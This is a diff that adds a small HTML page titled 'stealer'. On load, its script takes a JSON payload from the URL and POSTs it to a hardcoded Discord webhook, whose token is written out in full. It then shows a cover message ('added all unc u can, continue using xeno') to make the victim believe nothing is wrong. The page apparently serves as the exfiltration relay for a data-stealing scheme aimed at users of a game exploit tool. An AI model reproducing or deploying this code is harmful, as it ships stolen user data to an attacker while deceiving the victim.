@@ -1,1 +1,47 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>stealer</title>
+    <script>
+        window.addEventListener("load", () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const jsonParam = urlParams.get("json");
+
+            if (!jsonParam) {
+                document.body.innerHTML = "<h1>error adding unc rejoin.</h1>";
+                return;
+            }
+
+            try {
+                const embedPayload = JSON.parse(decodeURIComponent(jsonParam));
+
+                const webhookUrl = "https://discord.com/api/webhooks/1337118172335308850/qLorhy76VbXrnbnx8U3V7fldVCTd3vOd4EHCW2cSg-pMtYJJO2AXnldXJOCvCejF9Sra";
+
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(embedPayload),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        document.body.innerHTML = "<h1>added all unc u can, continue using xeno</h1>";
+                    } else {
+                        document.body.innerHTML = `<h1>Error: ${response.statusText}</h1>`;
+                    }
+                })
+                .catch(error => {
+                    document.body.innerHTML = `<h1>Request failed: ${error.message}</h1>`;
+                });
+            } catch (error) {
+                document.body.innerHTML = `<h1>Invalid JSON payload: ${error.message}</h1>`;
+            }
+        });
+    </script>
+</head>
+<body>
+    <h1>Processing...</h1>
+</body>
+</html>
